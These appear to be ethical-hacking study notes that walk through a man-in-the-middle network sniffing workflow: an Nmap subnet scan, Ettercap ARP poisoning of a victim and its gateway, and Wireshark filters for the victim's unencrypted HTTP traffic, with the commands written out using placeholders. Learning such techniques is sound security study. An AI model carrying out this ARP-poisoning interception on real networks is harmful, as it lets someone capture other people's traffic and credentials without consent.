# Ethical Hacking - Reconnaissance - Network Sniffing - Man in the Middle (MiTM)

## Tools 
+ Wireshark
+ Nmap 
+ Ettercap

## Ettercap

### Synopsis/Syntax 
```console
sudo ettercap {options} [arguments...]
```

### Parameters
#### Attack Modes
+ -M [method] : Man-in-the-Middle Attack
    - Methods
        + arp:remote [/router//]  [/victim's IP//] : Man in the Middle using ARP on a remote target (victim) 
            - router : victim's default gateway of the router
            - victim's IP : The victim device you want to sniff/capture/attack     

#### Options
+ -I [interface] : Target Interface
+ -S : No SSL
+ -T : Text Only, no graphical 

### Usage

## WorkFlow
> Method/Order of Operation
- Man-in-the-Middle Network Sniffing
    1. Reconnaissance/Gather information on target in Subnet (using Nmap)
        ```console
        sudo nmap -ss [target_subnet/prefix]
        ```
    2. Start Man-in-the-Middle interception/sniffing process (using Ettercap)
        ```console
        sudo ettercap -T -S -I wlan0 -M arp:remote /default_gateway// /target_IP//
        ```
    3. Catch/sniff the packets into a pcap file (using Wireshark)
        - Filter the packet to see your target's IP
            ```console
            Filter: ip.addr == target_IP
            ```
        - Filter the packet to see your target's IP and an unencrypted protocol
            ```console
            Filter: ip.addr == target_IP && http
            ```

## References
+ [YouTube | NetworkChuck | how Hackers SNiFF (capture) network traffic //MiTM Attack](https://youtu.be/-rSqbgI7oZM)